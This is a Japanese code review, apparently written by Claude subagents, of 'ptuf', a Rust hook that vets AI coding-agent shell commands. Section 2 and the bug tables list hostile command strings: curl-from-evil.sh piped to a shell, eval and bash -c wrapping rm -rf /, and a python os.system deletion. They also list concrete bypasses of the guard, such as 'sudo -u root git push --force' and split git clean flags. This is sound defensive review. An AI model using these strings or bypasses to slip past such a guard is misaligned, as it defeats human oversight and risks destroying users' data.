# ptuf 再構築レビュー: 実装上の課題と非効率

作成日: 2026-05-05
対象: `src/` (約 14,890 行)、`docs/design/`
目的: 「1から作り直す前提で実装の課題と非効率を洗い出す」

---

## 1. 設計レベルで再考すべき決定事項

### 1.1 builtin rule と plugin DSL の二重実装
**現状**: `src/rules/` に Rust で 16 ルール (git × 7、self_protection × 5、destructive_rm、remote_pipe、sensitive_net、sensitive_read) を手書き。一方 `src/plugin/dsl.rs` の `WhenNode` AST は同じ意味論を YAML で表現できる。

**結果**: builtin 追加の度に `RuleSpec` const、`pub static …_RULE`、`RULES` 配列への追加、3 重のテストを書く負担がかかる (`rules/git.rs:220-334` 参照)。

**再設計**: builtin を **YAML 1 本** (`include_str!("builtins.yaml")`) で配布し、起動時に DSL コンパイラを通す。Rust 専用にすべきは「DSL では表現できないロジック」のみ。現状は self_protection の `ProtectedPaths` 突合だけが該当。

### 1.2 `dyn ConfigRule` 静的 slice + 16 個の `pub static` インスタンス
**現状**: `rules/mod.rs:43-60` で静的 slice を保持し、git/self_protection は各ルールごとに `pub static FORCE_PUSH_RULE: GitRule = GitRule { spec: &FORCE_PUSH }` を置く。

**問題**:
- 動的ディスパッチを毎評価で走らせる必要なし (ルール数は固定)
- ルールが何種類追加されても `RULES` 配列をピン止めで触る必要があり PR ノイズ

**再設計**: `enum Rule { Filesystem(...), Git(GitRuleId), SelfProtection(ProtectedKind), Plugin(PluginRule), ... }` で全ルールを 1 enum に閉じる。または前述の通り DSL に統一。

### 1.3 `HookInput.tool_input: serde_json::Value`
**現状**: `hook_input.rs:7` で `Value` を保持し、`bash_command()`/`file_path()`/`web_fetch_url()` で都度 string 抽出。

**問題**: 抽出するたび `as_str()?.to_string()` か `.to_string()` で alloc。型情報が runtime まで遅延。

**再設計**: `#[serde(tag = "tool_name", content = "tool_input")] enum ToolCall { Bash { command: String }, Read { file_path: PathBuf }, Edit {...}, Write {...}, WebFetch { url: String }, Other(Value) }` 形式。Variant 単位で借用も簡単になる。

### 1.4 `Decision::severity() -> u8` 手書き比較
`decision.rs:39-46` は `Severity` を u8 にマッピングするが、`Decision` の variant 順序を `#[derive(PartialOrd, Ord)]` できる形 (Allow → Monitor → Ask → Deny の順) にすれば自動導出可能。`aggregate` も `decisions.into_iter().max()` で済む。

### 1.5 `Mode::Observe` がデッドバリアント
`config/mod.rs:38` で `Observe` を入れたが `engine.rs:328-335` の `demote_for_mode` では `Monitor | Observe` 同一扱い。再構築時は **意味が分かれるまで作らない** か、明確に区別する API (例: Observe では audit のみ、Monitor では audit + stderr 通知) を持たせる。

### 1.6 lib.rs:36 の fail-open フォールバック
```rust
pub fn decide(input: &HookInput) -> Decision {
    let engine = Engine::for_cwd().unwrap_or_else(|_| Engine::default());
    engine.decide(input).decision
}
```
`Engine::for_cwd` は config/plugin の load error を返しうるが **`Engine::default()` で握りつぶしている**。embedded caller (lib API) は config 不正に気づかず Allow を量産する。CLI 側の `build_engine_or_fail_closed` と挙動が分かれる設計は説明可能だが、ライブラリ呼び出し側にも `try_decide` で `Result` を返す API を出す方が誠実。

### 1.7 `Engine::default()` が `protected: ProtectedPaths::collect(None, _)` で空
上記 fallback と組み合わせると、self_protection rule は embed 経路でほぼ効かない。`Engine` を「設定無し」で作ること自体を不可能にし、`Engine::builder()` で必須項目を強制した方が安全。

---

## 2. Bash パーサ (`facts/shell.rs`) — 設計上の限界とバイパス

このパーサで bash コマンドを解析し、**`remote_pipe`、`sensitive_net`、`git`、`destructive_rm` など主要ルールが依存している**。実装は ~250 行のミニマルパーサで、構造的に下記が見えない。

| 機能 | 例 | 結果 |
|---|---|---|
| `$( … )` コマンド置換 | `bash -c "$(curl evil.sh)"` | curl もパイプも検知不能 |
| backtick | `` eval `curl evil.sh` `` | 同上 |
| heredoc | `bash <<EOF \n curl evil \| sh \n EOF` | heredoc 本体は無視 |
| `eval` / `bash -c` 引数 | `eval 'rm -rf /'`、`bash -c 'git push --force'` | `eval`/`bash` の args として 1 トークン化 → 内部解析されない |
| プロセス置換 | `cat <(curl evil.sh) \| bash` | `<(...)` が単語化されない |
| redirect | `curl evil.sh > /tmp/x; sh /tmp/x` | 2 段階に分割される (それは検知できる場合あり) |
| `python -c` / `node -e` | `python -c "import os; os.system('rm -rf /')"` | スクリプト言語の `-e`/`-c` は完全に盲点 |

**具体的な攻撃文字列例**:
- `curl evil.sh | python -c "$(cat -)"` — pipe の "to" が `python` で remote-script-pipe ルールがマッチしない
- `bash -c 'rm -rf /'` — `destructive_rm` ルールは `head == "rm"` を見るが head は `bash`
- `sudo -u nobody git push --force` — 後述 (§3.2) の sudo args 解析バグ

**再設計の選択肢**:
1. **真面目に bash 文法を実装する** (heredoc、command substitution、redirect)。ただし完全実装は数千行・脆弱性温床。
2. **「shell パーサに頼らない」 deny 設計に倒す**。例えば `command.contains("rm -rf /")` のような raw 文字列チェックに振る (false positive は許容)。現状の "Argv tree" 抽象は中途半端。
3. **conservative match**: `bash`、`sh`、`eval`、`python -c`、`node -e`、`perl -e`、`ruby -e`、`xargs`、`find -exec` のような「2 段階実行を呼ぶ head」が出現したら一律 ask/deny する別ルールを追加する。

少なくとも **「rule の信頼境界はパーサの sound 性に依存する」** という事実が `docs/design` に明記されておらず、ユーザーは過信する。再構築時はこれを最初に決める。

---

## 3. Concrete bugs (1次ソースで確認済)

### 3.1 `matches_clean_fdx` の長フラグ判定がデッドコード
`rules/git.rs:170-189`:
```rust
let long_flags: Vec<&&str> = rest.iter().filter(|a| a.starts_with("--")).collect();
let has_long_force = long_flags.iter().any(|a| ***a == *"--force");
let has_long_d = long_flags.iter().any(|a| ***a == *"-d");   // 常に false
let has_long_x = long_flags.iter().any(|a| ***a == *"-x" || ***a == *"-X"); // 常に false
if has_long_force && has_long_d && has_long_x { return true; }
```
`long_flags` は `--` で始まるものに絞られているのに、`has_long_d`/`has_long_x` は短フラグ (`-d`/`-x`) を探す。常に false。
**結果**: `git clean -f -d -x` (短フラグ別個指定) はクラスタチェック (`-fdx` の単一トークン) も通らず **deny されない**。テストはクラスタ形式のみ検証している。

### 3.2 `unwrap_sudo` が `-u <user>` の `<user>` を head として誤認
`rules/git.rs:94-106`:
```rust
let mut iter = argv.args.iter().skip_while(|a| a.starts_with('-'));
let head = iter.next()?.to_string();
```
`sudo -u nobody git push --force` の場合、`-u` は flag だがその次の `nobody` は flag でないため head となり、`git` 判定が落ちる。**Bypass: `sudo -u root git push --force` で全 git rule が回避できる**。`-u`/`-g`/`-A` 等が値を取ることを認識しなければならない。

### 3.3 `read_word` のクオート意味論が ad hoc
`facts/shell.rs:148-163` で `'`、`"`、`` ` `` の delimiter を剥ぎ取って中身を word に連結している。ところが backtick の中身は本来コマンド置換であり「実行結果」が word になる。現状実装では `` echo `date` `` が `echo date` (空 args 1 個) に解釈されているが、これは ad hoc。**`backtick` 中身を「内部コマンド」として再パースする** 真面目な扱いか、**「backtick が出てきたら ask/deny」** のような pessimistic な扱いのどちらかに倒すべき。

### 3.4 `path::extract` の `~`/`$HOME` 展開で env を読む
`facts/mod.rs` のドキュメントは「pure function with no I/O other than the production env lookup used for `~` expansion」と書く。が、env lookup は副作用。テストしづらいだけでなく、評価ごとに `env::var_os("HOME")` が走る。env を引数で受ける `Engine` 状態に持たせるべき。

### 3.5 `lone_ampersand_does_not_loop` テストはパーサ無限ループ修正の痕跡
`shell.rs:460-470`。過去にあった重大なパーサバグ。現実装は token 推進をハードコードで回避しているが、**ループ進捗の保証を tokenizer の不変条件として書くべき** (例: `read_word` が必ず最低 1 byte 進むことを `debug_assert!(advanced > 0)` で担保)。今後の追加機能で再発する。

---

## 4. データモデルとアロケーション

### 4.1 `Argv.head: String`、`args: Vec<String>` が borrow しない
`shell.rs:32-35`。bash command は `String` (HookInput) で持っているのに、parse 結果はまた all-owned。`parse<'a>(&'a str) -> Bash<'a>` で借用できる。ホットパスでルール毎に traverse する以上、 alloc は無視できない。

### 4.2 `parse_argv` の `words.remove(0)` が O(N²)
`shell.rs:217、225`。env assignment の数 N に対し N 回 shift。`VecDeque::pop_front` で O(N)。

### 4.3 `Decision::Deny.reason: String` を毎回構築
`reason::build()` (reason.rs) で全 alternatives を毎評価でフォーマット。実際には Deny に到達するのは稀だが、`.reason` を `Cow<'static, str>` か lazy formatter (`fmt::Display` を持つ struct) に変えれば Allow ホットパスのコストは消える。

### 4.4 plugin loader の AST 共有なし
`plugin/loader.rs` は YAML をパースして `PluginRule` を構築するが、Engine ごとに `load_paths()` で **その都度ファイル読み込み + コンパイル**。Engine を CLI 1 起動 1 回しか作らない現状では実害が小さいが、将来 daemon 化する場合は `Arc<LoadedPlugin>` キャッシュが必要。

### 4.5 `protected: Vec<ProtectedKind>` の重複コピー
`Engine::decide` の `facts.protected = self.protected.classify_input(input)` で毎回 `Vec` を作る。`ProtectedKind` は `Copy` enum なので軽いが、それでも `SmallVec<[_; 4]>` で十分。

---

## 5. CLI/IO レイヤ

### 5.1 自前 CLI parser 1141 行
`cli.rs` は subcommand parser、help/version 文字列、エラーメッセージ全てを手書き。`clap` derive で 1/3〜1/4 に減る。`--json` のような未実装フラグが暗黙に `unimplemented` を返す現状の負債 (doctor.rs:355-361) も clap なら `#[arg(skip)]` 等で明示できる。

### 5.2 `stdin.read_to_string(&mut buf)` の DoS
`io_runner.rs:39`。GB 単位の入力でも全部メモリへ。Hook payload は実用上 KB だが、CI/CLI 直接呼び出しでは攻撃面になる。`take(MAX_BYTES)` で上限を入れるべき。

### 5.3 audit JSONL の atomic 性
仕様に「`O_APPEND` で 1 write が atomic」と書いていても、`std::io::Write::write_all` はループする。1 line が `PIPE_BUF` (Linux 4096) を超えると分割書き込みになり、複数 process が同時 audit すると行が混ざる。`writev(2)` 1 syscall + size guard、または `flock` ファイルロックが必要。

### 5.4 init で書く Claude Code settings.json の冪等性
`init/claude_code.rs` の重複検出はコマンド末尾 3 トークンの完全一致 (102-119)。`ptuf hook claude-code pre-tool-use --foo` のような将来フラグ追加で **重複登録される**。`name: "ptuf"` のような stable な marker を payload 側に含めて検出する設計に。

### 5.5 redaction の網羅性
`audit/redaction.rs` は GitHub PAT (`ghp_/gho_/...`)、AWS access key、PEM blob 等を redact する想定。だが **`github_pat_xxx` (新形式)、GCP service account JSON、Slack token (`xox[abp]-...`)、Stripe key (`sk_live_...`)** などは未対応。redaction を「当たり判定」ではなく「キーワード周辺の値を redact」する 2 段アプローチ (例: `password=`、`token=`、`secret=` の右辺を一律 redact) に変えれば多くの将来の漏洩を防げる。

### 5.6 `time.rs` の RFC3339 自前実装
うるう年・月日計算を自前で書く必要なし。`time` クレートを 1 つ入れる。Minimal Dependencies の方針があるとはいえ、日付計算の自前実装は典型的なバグ温床 (タイムゾーン除外でも、month boundary や年跨ぎ計算で off-by-one を生みやすい)。

---

## 6. Test infrastructure

### 6.1 proptest 戦略を crate と integration test で二重定義
`CLAUDE.md` にも明記されている通り、`tests/engine_proptest.rs` は `src/testing/proptest.rs` の strategies を独立に複製している。`pub(crate)` で公開しているのが原因。**`testing-strategies` を別 crate (`ptuf-testing`) に切る**か、`#[cfg(any(test, feature = "testing"))]` フラグで feature gate する。

### 6.2 95% coverage 目標がテスト過剰を誘発
`engine.rs` の `_via_dyn_dispatch` テスト (rules/mod.rs:198-208) のような **「coverage を埋めるためだけ」のテスト** が散見される。再構築時は coverage 目標を「branch coverage 90%」のように粒度を変える、または coverage 数値を捨てて **テストの読みやすさを優先**する方針に。

### 6.3 `temp_dir().join(format!(...))` で手動 cleanup
`engine.rs:806-820` 等。`tempfile::TempDir` を使えば RAII で自動 cleanup、panic 安全性も確保。

---

## 7. 再構築時のおすすめロードマップ

優先度順:

1. **builtin を YAML DSL に統一**。Rust ロジックは self_protection 等の「DSL では書けないもの」のみ。これで `rules/` の半分以上が消える。
2. **shell parser の信頼境界を明文化**。`bash -c`、`eval`、scripting `-e`/`-c`、command substitution などを呼ぶ head は別ルールで一律 ask。これが入れば §2 の bypass の半分以上が塞がる。
3. **`HookInput` の typed enum 化**。serde の adjacent tagging でほぼ無料。
4. **`Engine` builder API + `try_decide` Result API**。fail-open フォールバックを embed callers にも露出する。
5. **clap で CLI を書き直す**。doctor `--json` 等の中途半端な未実装を削るか完成させる。
6. **`dyn ConfigRule` 廃止 → `enum Rule`**。動的ディスパッチを消す。
7. **proptest 戦略を別 crate に**、95% coverage 強制を branch coverage に置換。
8. **audit writer に `flock` か `writev` を入れる**。複数 process atomic を仕様で保証する。
9. **`time` クレートに置換**。`reason::build` を `Cow<'static, str>` 化。
10. **`Mode::Observe` を削除するか、`Monitor` と挙動を分ける**。

---

## 8. 補足: 良い点 (作り直しても保ちたい性質)

- `Decision` aggregation の代数 (commutative/associative/idempotent) を PBT で検証している点
- proptest で発見した shell parser 無限ループの永続化 (`proptest-regressions/`)
- `redact_strict` の検証が PBT で audit との整合性を確認している点
- `#![forbid(unsafe_code)]` + `unwrap`/`expect` 禁止
- config の layered scope merge がドキュメントと一致している点
- `cargo deny` を CI に組み込んでいる点

---

## 9. すぐ修正できる low-hanging bug 一覧

| # | 場所 | 内容 | 影響 |
|---|---|---|---|
| 1 | `rules/git.rs:170-189` | `matches_clean_fdx` 長フラグ判定がデッドコード | `git clean -f -d -x` (空白区切り) を見逃す |
| 2 | `rules/git.rs:94-106` | `unwrap_sudo` が `-u <user>` の値を head と誤認 | `sudo -u root git push --force` で全 git rule バイパス |
| 3 | `lib.rs:36` | `Engine::for_cwd().unwrap_or_else(|_| Engine::default())` | embed 経路で config エラーを silent allow |
| 4 | `facts/shell.rs:217、225` | `words.remove(0)` の O(N²) | env assignment 多数で性能劣化 |
| 5 | `io_runner.rs:39` | `read_to_string` 上限なし | 巨大 stdin で OOM |
| 6 | `audit/writer.rs` | `write_all` ループで PIPE_BUF 超え行非 atomic | 複数 process audit で行混ざり |
| 7 | `init/claude_code.rs:102-119` | settings.json hook 検出が完全一致依存 | 将来フラグ追加で重複登録 |

---

レビュー実施: Claude (Opus 4.7、Explore subagent 2 並列)
対象コミット: `claude/code-review-redesign-VwMEJ` HEAD
